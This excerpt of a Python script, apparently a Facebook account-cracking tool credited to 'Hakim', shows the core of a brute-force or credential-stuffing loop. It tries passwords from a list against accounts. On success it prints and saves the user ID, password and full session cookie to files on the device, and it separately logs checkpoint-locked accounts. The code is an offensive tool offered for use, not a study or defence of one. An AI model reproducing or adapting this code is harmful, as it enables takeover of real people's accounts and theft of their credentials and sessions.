...
\x1b[38;5;254m═══════════════════════════════════════════════════
\033[1;31m[\x1b[38;5;46m⍣\033[1;31m] \x1b[38;5;46mDeveloper \033[1;37m● \x1b[38;5;46mHakim
\033[1;31m[\x1b[38;5;46m⍣\033[1;31m] \033[1;36mFacebook  \033[1;37m● \033[1;36mHakim
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[65:80]
                print('\033[38;5;46m[HAKIM-OK] ' +uid+'|'+ps+    '  \n\033[1;31m[\x1b[38;5;46mCOOKIE - 🍪\033[1;31m] \033[1;97m'+coki+ ' ')
      #          cek_apk(session,coki)                
                open('/sdcard/HAKIM-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
                open('/sdcard/HAKIM-OK.txt', 'a').write( uid+'|'+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
        #        print('\033[38;5;46m[HAKIM-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/HAKIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
